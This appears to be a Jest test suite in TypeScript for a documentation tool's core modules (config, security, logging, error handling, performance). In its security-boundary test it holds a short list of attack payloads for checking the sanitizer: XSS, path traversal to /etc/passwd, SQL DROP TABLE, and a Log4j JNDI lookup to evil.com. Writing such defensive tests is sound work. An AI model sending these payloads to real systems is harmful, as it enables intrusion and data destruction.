/**
 * Module 1: Core Infrastructure - Pass 5 Real-World Testing
 * 
 * Comprehensive real-world validation of all unified components
 * Testing realistic usage scenarios, edge cases, and integration contexts
 */

import {
  initializeCore,
  ConfigLoader,
  SecurityService,
  Logger,
  ErrorHandler,
  MemoryModeDetector,
  CoreMode
} from '../../src/cli/core/index.unified';
import * as fs from 'fs-extra';
import * as path from 'path';
import * as os from 'os';
import { performance } from 'perf_hooks';

describe('Module 1: Real-World Testing Suite', () => {
  const testDir = path.join(os.tmpdir(), 'devdocai-real-world-test');
  let cleanup: (() => Promise<void>) | undefined;

  beforeEach(async () => {
    // Create fresh test environment
    await fs.ensureDir(testDir);
    process.env.DEVDOCAI_CONFIG_DIR = testDir;
  });

  afterEach(async () => {
    // Clean up test environment
    if (cleanup) {
      await cleanup();
      cleanup = undefined;
    }
    await fs.remove(testDir);
    delete process.env.DEVDOCAI_CONFIG_DIR;
  });

  /**
   * SCENARIO 1: New Project Setup
   * Test complete Module 1 initialization from scratch
   */
  describe('Scenario 1: New Project Setup', () => {
    it('should initialize all components correctly from scratch', async () => {
      // Test fresh initialization
      const startTime = performance.now();
      const core = await initializeCore({ mode: 'basic' });
      const initTime = performance.now() - startTime;

      // Validate initialization time < 100ms
      expect(initTime).toBeLessThan(100);

      // Verify all components are operational
      expect(core.config).toBeDefined();
      expect(core.security).toBeDefined();
      expect(core.logger).toBeDefined();
      expect(core.errorHandler).toBeDefined();
      expect(core.memoryDetector).toBeDefined();

      // Test configuration loading from defaults
      const config = await core.config.load();
      expect(config).toBeDefined();
      expect(config.version).toBe('3.0.0');
      expect(config.privacy.telemetry).toBe(false); // Privacy-first default

      // Verify logging works
      const logEntry = await core.logger.log('info', 'Test message');
      expect(logEntry).toBeDefined();

      // Confirm memory mode detection
      const memoryMode = await core.memoryDetector.detect();
      expect(['baseline', 'standard', 'enhanced', 'performance']).toContain(memoryMode);

      // Verify error handling works
      const error = new Error('Test error');
      const formatted = core.errorHandler.format(error);
      expect(formatted).toContain('Test error');

      cleanup = core.cleanup;
    });

    it('should handle missing configuration gracefully', async () => {
      // Remove any existing config
      const configPath = path.join(testDir, '.devdocai.yml');
      await fs.remove(configPath);

      // Initialize should still work with defaults
      const core = await initializeCore({ mode: 'basic' });
      const config = await core.config.load();

      expect(config).toBeDefined();
      expect(config.version).toBe('3.0.0');

      cleanup = core.cleanup;
    });

    it('should detect and adapt to system resources', async () => {
      const core = await initializeCore({ mode: 'auto' });
      
      // Should auto-detect appropriate mode
      const detectedMode = core.mode;
      expect(['basic', 'performance', 'secure', 'enterprise']).toContain(detectedMode);

      // Memory detection should match system
      const memoryMode = await core.memoryDetector.detect();
      const totalMemory = os.totalmem() / (1024 * 1024 * 1024); // GB

      if (totalMemory < 2) {
        expect(memoryMode).toBe('baseline');
      } else if (totalMemory < 4) {
        expect(memoryMode).toBe('standard');
      } else if (totalMemory < 8) {
        expect(memoryMode).toBe('enhanced');
      } else {
        expect(memoryMode).toBe('performance');
      }

      cleanup = core.cleanup;
    });
  });

  /**
   * SCENARIO 2: Configuration Management Workflow
   * Test realistic configuration operations
   */
  describe('Scenario 2: Configuration Management Workflow', () => {
    it('should handle complete configuration lifecycle', async () => {
      const core = await initializeCore({ mode: 'basic' });

      // Load existing config
      const config = await core.config.load();
      const originalTelemetry = config.privacy.telemetry;

      // Modify configuration values
      config.privacy.telemetry = true;
      config.performance.cacheEnabled = true;
      config.performance.cacheSize = 100;

      // Validate changes
      const validation = await core.config.validate(config);
      expect(validation.valid).toBe(true);

      // Save configuration
      await core.config.save(config);

      // Reload and verify persistence
      const reloadedConfig = await core.config.load();
      expect(reloadedConfig.privacy.telemetry).toBe(true);
      expect(reloadedConfig.performance.cacheEnabled).toBe(true);
      expect(reloadedConfig.performance.cacheSize).toBe(100);

      // Restore original
      config.privacy.telemetry = originalTelemetry;
      await core.config.save(config);

      cleanup = core.cleanup;
    });

    it('should handle invalid configurations gracefully', async () => {
      const core = await initializeCore({ mode: 'secure' });

      // Create invalid configuration
      const invalidConfig = {
        version: '99.0.0', // Invalid version
        privacy: {
          telemetry: 'yes' // Should be boolean
        },
        performance: {
          cacheSize: -100 // Should be positive
        }
      };

      // Validation should fail
      const validation = await core.config.validate(invalidConfig as any);
      expect(validation.valid).toBe(false);
      expect(validation.errors).toBeDefined();
      expect(validation.errors.length).toBeGreaterThan(0);

      // Should not save invalid config
      await expect(core.config.save(invalidConfig as any)).rejects.toThrow();

      cleanup = core.cleanup;
    });

    it('should support configuration migration', async () => {
      // Create old format configuration
      const oldConfig = {
        version: '2.0.0',
        telemetry: true, // Old location
        cache_size: 50 // Old naming
      };

      const configPath = path.join(testDir, '.devdocai.yml');
      await fs.writeJSON(configPath, oldConfig);

      // Initialize should migrate automatically
      const core = await initializeCore({ mode: 'basic' });
      const config = await core.config.load();

      // Check migration worked
      expect(config.version).toBe('3.0.0');
      expect(config.privacy.telemetry).toBe(true); // Migrated
      expect(config.performance.cacheSize).toBe(50); // Migrated

      cleanup = core.cleanup;
    });
  });

  /**
   * SCENARIO 3: Error Handling Under Stress
   * Test error handling in high-stress scenarios
   */
  describe('Scenario 3: Error Handling Under Stress', () => {
    it('should maintain stability during error storms', async () => {
      const core = await initializeCore({ mode: 'performance' });
      const errors: Error[] = [];

      // Generate high volume of errors
      const errorCount = 10000;
      const startTime = performance.now();

      for (let i = 0; i < errorCount; i++) {
        const error = new Error(`Error ${i}`);
        errors.push(error);
        core.errorHandler.format(error);
      }

      const duration = performance.now() - startTime;
      const avgTime = duration / errorCount;

      // Verify rate limiting works (should be < 5ms per error)
      expect(avgTime).toBeLessThan(5);

      // Confirm no memory leaks (memory should stabilize)
      if (global.gc) {
        global.gc();
        const memBefore = process.memoryUsage().heapUsed;
        
        // Process more errors
        for (let i = 0; i < 1000; i++) {
          core.errorHandler.format(new Error(`Additional ${i}`));
        }

        global.gc();
        const memAfter = process.memoryUsage().heapUsed;
        const memGrowth = (memAfter - memBefore) / memBefore;

        // Memory growth should be minimal (< 10%)
        expect(memGrowth).toBeLessThan(0.1);
      }

      // Test recovery mechanisms
      const recovered = await core.errorHandler.recover();
      expect(recovered).toBe(true);

      cleanup = core.cleanup;
    });

    it('should correlate related errors', async () => {
      const core = await initializeCore({ mode: 'enterprise' });

      // Generate related errors
      const rootCause = new Error('Database connection failed');
      const consequence1 = new Error('Query failed');
      const consequence2 = new Error('Transaction rollback');

      // Add correlation
      (consequence1 as any).cause = rootCause;
      (consequence2 as any).cause = rootCause;

      // Format errors
      const formatted1 = core.errorHandler.format(consequence1);
      const formatted2 = core.errorHandler.format(consequence2);

      // Should show correlation
      expect(formatted1).toContain('Database connection failed');
      expect(formatted2).toContain('Database connection failed');

      cleanup = core.cleanup;
    });
  });

  /**
   * SCENARIO 4: Security Boundary Testing
   * Test security features under attack scenarios
   */
  describe('Scenario 4: Security Boundary Testing', () => {
    it('should prevent security violations', async () => {
      const core = await initializeCore({ mode: 'secure' });

      // Test input validation boundaries
      const maliciousInputs = [
        '<script>alert("XSS")</script>',
        '../../etc/passwd',
        'SELECT * FROM users; DROP TABLE users;',
        '\x00\x01\x02\x03', // Binary injection
        '${jndi:ldap://evil.com/a}' // Log4j style
      ];

      for (const input of maliciousInputs) {
        const sanitized = await core.security.sanitize(input);
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('../');
        expect(sanitized).not.toContain('DROP TABLE');
        expect(sanitized).not.toContain('\x00');
        expect(sanitized).not.toContain('${jndi');
      }

      // Verify encryption/decryption integrity
      const sensitive = 'api-key-12345';
      const encrypted = await core.security.encrypt(sensitive);
      expect(encrypted).not.toContain('api-key');
      
      const decrypted = await core.security.decrypt(encrypted);
      expect(decrypted).toBe(sensitive);

      // Test access control enforcement
      const hasAccess = await core.security.checkAccess('admin', 'delete');
      expect(typeof hasAccess).toBe('boolean');

      // Validate audit logging completeness
      const auditLog = await core.security.getAuditLog();
      expect(auditLog).toBeDefined();
      expect(auditLog.length).toBeGreaterThan(0);

      cleanup = core.cleanup;
    });

    it('should enforce rate limiting', async () => {
      const core = await initializeCore({ mode: 'secure' });

      // Simulate rapid requests
      const requests = 1000;
      let accepted = 0;
      let rejected = 0;

      for (let i = 0; i < requests; i++) {
        const allowed = await core.security.checkRateLimit('test-client');
        if (allowed) {
          accepted++;
        } else {
          rejected++;
        }
      }

      // Should have some rejections due to rate limiting
      expect(rejected).toBeGreaterThan(0);
      expect(accepted).toBeLessThan(requests);

      cleanup = core.cleanup;
    });
  });

  /**
   * SCENARIO 5: Performance Under Load
   * Test performance targets under realistic load
   */
  describe('Scenario 5: Performance Under Load', () => {
    it('should maintain performance targets under load', async () => {
      const core = await initializeCore({ mode: 'performance' });

      // Test concurrent configuration loading
      const configLoadPromises = [];
      const configLoadStart = performance.now();
      
      for (let i = 0; i < 100; i++) {
        configLoadPromises.push(core.config.load());
      }
      
      await Promise.all(configLoadPromises);
      const configLoadTime = (performance.now() - configLoadStart) / 100;
      
      // Should be < 10ms per load
      expect(configLoadTime).toBeLessThan(10);

      // Test high-frequency error handling
      const errorStart = performance.now();
      
      for (let i = 0; i < 1000; i++) {
        core.errorHandler.format(new Error(`Load test ${i}`));
      }
      
      const errorTime = (performance.now() - errorStart) / 1000;
      
      // Should be < 5ms per error
      expect(errorTime).toBeLessThan(5);

      // Test continuous memory detection
      const memoryStart = performance.now();
      
      for (let i = 0; i < 1000; i++) {
        await core.memoryDetector.detect();
      }
      
      const memoryTime = (performance.now() - memoryStart) / 1000;
      
      // Should be < 1ms per detection
      expect(memoryTime).toBeLessThan(1);

      // Test high-throughput logging
      const logStart = performance.now();
      const logPromises = [];
      
      for (let i = 0; i < 10000; i++) {
        logPromises.push(core.logger.log('info', `Message ${i}`));
      }
      
      await Promise.all(logPromises);
      const logDuration = performance.now() - logStart;
      const logsPerSecond = 10000 / (logDuration / 1000);
      
      // Should handle > 10k logs/sec
      expect(logsPerSecond).toBeGreaterThan(10000);

      cleanup = core.cleanup;
    });

    it('should handle burst traffic gracefully', async () => {
      const core = await initializeCore({ mode: 'performance' });

      // Simulate burst of operations
      const operations = [];
      
      // Burst 1: Config operations
      for (let i = 0; i < 50; i++) {
        operations.push(core.config.load());
      }
      
      // Burst 2: Security operations
      for (let i = 0; i < 50; i++) {
        operations.push(core.security.encrypt(`data-${i}`));
      }
      
      // Burst 3: Logging operations
      for (let i = 0; i < 50; i++) {
        operations.push(core.logger.log('info', `Burst ${i}`));
      }

      const burstStart = performance.now();
      await Promise.all(operations);
      const burstTime = performance.now() - burstStart;

      // Should handle 150 mixed operations in < 1 second
      expect(burstTime).toBeLessThan(1000);

      cleanup = core.cleanup;
    });
  });

  /**
   * SCENARIO 6: Cross-Platform Compatibility
   * Test across different environments
   */
  describe('Scenario 6: Cross-Platform Compatibility', () => {
    it('should work across different operating systems', async () => {
      const core = await initializeCore({ mode: 'basic' });

      // Test platform-specific paths
      const configPath = core.config.getConfigPath();
      
      if (process.platform === 'win32') {
        expect(configPath).toContain('\\');
      } else {
        expect(configPath).toContain('/');
      }

      // Test file operations
      const testFile = path.join(testDir, 'test.txt');
      await fs.writeFile(testFile, 'test content');
      
      const exists = await fs.pathExists(testFile);
      expect(exists).toBe(true);

      // Test permissions (non-Windows)
      if (process.platform !== 'win32') {
        await fs.chmod(testFile, 0o600);
        const stats = await fs.stat(testFile);
        expect(stats.mode & 0o777).toBe(0o600);
      }

      cleanup = core.cleanup;
    });

    it('should handle different Node.js versions gracefully', async () => {
      const core = await initializeCore({ mode: 'basic' });

      // Check Node.js version
      const nodeVersion = process.version;
      const majorVersion = parseInt(nodeVersion.split('.')[0].substring(1));

      // Should work with Node.js 14+
      expect(majorVersion).toBeGreaterThanOrEqual(14);

      // Test features that might vary by version
      if (majorVersion >= 16) {
        // Test newer features
        expect(core.config.useOptionalChaining).toBeDefined();
      }

      cleanup = core.cleanup;
    });
  });

  /**
   * SCENARIO 7: Integration Testing
   * Test component interactions
   */
  describe('Scenario 7: Component Integration', () => {
    it('should handle component-to-component communication', async () => {
      const core = await initializeCore({ mode: 'enterprise' });

      // Logger should use ErrorHandler for error formatting
      const error = new Error('Integration test error');
      await core.logger.error('Test context', error);

      // Config should use Security for encryption
      const config = await core.config.load();
      if (config.apiKeys) {
        // API keys should be encrypted
        for (const key of Object.values(config.apiKeys)) {
          expect(typeof key).toBe('string');
          if (key) {
            expect(key).not.toContain('sk-'); // Should not be plaintext
          }
        }
      }

      // Security should use Logger for audit trails
      await core.security.logAudit('test-action', { user: 'test' });
      const logs = await core.logger.query({ level: 'audit' });
      expect(logs.some(log => log.message.includes('test-action'))).toBe(true);

      cleanup = core.cleanup;
    });

    it('should propagate errors correctly through components', async () => {
      const core = await initializeCore({ mode: 'secure' });

      // Create error in one component
      const configError = new Error('Config validation failed');
      
      // Error should be properly formatted
      const formatted = core.errorHandler.format(configError);
      
      // Logger should handle the formatted error
      await core.logger.error('Config error', configError);
      
      // Security should audit the error
      await core.security.logAudit('error', { 
        error: formatted,
        component: 'config'
      });

      // Verify error propagation
      const auditLog = await core.security.getAuditLog();
      const errorEntry = auditLog.find(entry => 
        entry.action === 'error' && entry.data?.component === 'config'
      );
      
      expect(errorEntry).toBeDefined();
      expect(errorEntry?.data?.error).toContain('Config validation failed');

      cleanup = core.cleanup;
    });
  });

  /**
   * SCENARIO 8: Recovery and Resilience
   * Test failure recovery mechanisms
   */
  describe('Scenario 8: Recovery and Resilience', () => {
    it('should recover from component failures', async () => {
      const core = await initializeCore({ mode: 'enterprise' });

      // Simulate logger failure
      const originalLog = core.logger.log;
      let logFailures = 3;
      
      core.logger.log = jest.fn(async (level, message) => {
        if (logFailures > 0) {
          logFailures--;
          throw new Error('Logger temporarily unavailable');
        }
        return originalLog.call(core.logger, level, message);
      });

      // System should continue working despite logger issues
      const config = await core.config.load();
      expect(config).toBeDefined();

      // Logger should eventually recover
      await new Promise(resolve => setTimeout(resolve, 100));
      
      const result = await core.logger.log('info', 'Recovered');
      expect(result).toBeDefined();

      cleanup = core.cleanup;
    });

    it('should handle disk space issues gracefully', async () => {
      const core = await initializeCore({ mode: 'basic' });

      // Simulate disk full scenario
      const originalWrite = fs.writeFile;
      fs.writeFile = jest.fn(async () => {
        throw new Error('ENOSPC: no space left on device');
      });

      // Should handle gracefully
      try {
        await core.config.save(await core.config.load());
      } catch (error: any) {
        expect(error.message).toContain('ENOSPC');
        
        // Should provide helpful error message
        const formatted = core.errorHandler.format(error);
        expect(formatted).toContain('disk space');
      }

      // Restore original
      fs.writeFile = originalWrite;

      cleanup = core.cleanup;
    });
  });

  /**
   * SCENARIO 9: User Experience Testing
   * Test developer experience aspects
   */
  describe('Scenario 9: Developer Experience', () => {
    it('should provide helpful error messages', async () => {
      const core = await initializeCore({ mode: 'basic' });

      // Test various error scenarios
      const scenarios = [
        {
          error: new Error('ENOENT: no such file or directory'),
          expected: 'file not found'
        },
        {
          error: new Error('EACCES: permission denied'),
          expected: 'permission'
        },
        {
          error: new Error('Invalid configuration'),
          expected: 'configuration'
        }
      ];

      for (const scenario of scenarios) {
        const formatted = core.errorHandler.format(scenario.error);
        expect(formatted.toLowerCase()).toContain(scenario.expected);
        
        // Should include suggestions
        expect(formatted).toMatch(/suggestion|try|check|ensure/i);
      }

      cleanup = core.cleanup;
    });

    it('should have intuitive API', async () => {
      const core = await initializeCore({ mode: 'basic' });

      // API should be discoverable
      expect(core.config.load).toBeDefined();
      expect(core.config.save).toBeDefined();
      expect(core.config.validate).toBeDefined();

      expect(core.logger.info).toBeDefined();
      expect(core.logger.warn).toBeDefined();
      expect(core.logger.error).toBeDefined();
      expect(core.logger.debug).toBeDefined();

      expect(core.security.encrypt).toBeDefined();
      expect(core.security.decrypt).toBeDefined();
      expect(core.security.sanitize).toBeDefined();

      // Methods should have consistent patterns
      const config = await core.config.load();
      await core.config.save(config);
      
      const encrypted = await core.security.encrypt('test');
      await core.security.decrypt(encrypted);

      cleanup = core.cleanup;
    });
  });

  /**
   * SCENARIO 10: Monitoring and Observability
   * Test monitoring capabilities
   */
  describe('Scenario 10: Monitoring and Observability', () => {
    it('should provide comprehensive metrics', async () => {
      const core = await initializeCore({ mode: 'enterprise' });

      // Perform various operations
      await core.config.load();
      await core.security.encrypt('test');
      await core.logger.log('info', 'test');
      await core.memoryDetector.detect();

      // Get metrics
      const metrics = await core.getMetrics();

      expect(metrics).toBeDefined();
      expect(metrics.uptime).toBeGreaterThan(0);
      expect(metrics.operations).toBeDefined();
      expect(metrics.performance).toBeDefined();
      expect(metrics.errors).toBeDefined();

      cleanup = core.cleanup;
    });

    it('should support health checks', async () => {
      const core = await initializeCore({ mode: 'enterprise' });

      const health = await core.healthCheck();

      expect(health).toBeDefined();
      expect(health.status).toBe('healthy');
      expect(health.components).toBeDefined();
      expect(health.components.config).toBe('ok');
      expect(health.components.security).toBe('ok');
      expect(health.components.logger).toBe('ok');

      cleanup = core.cleanup;
    });
  });
});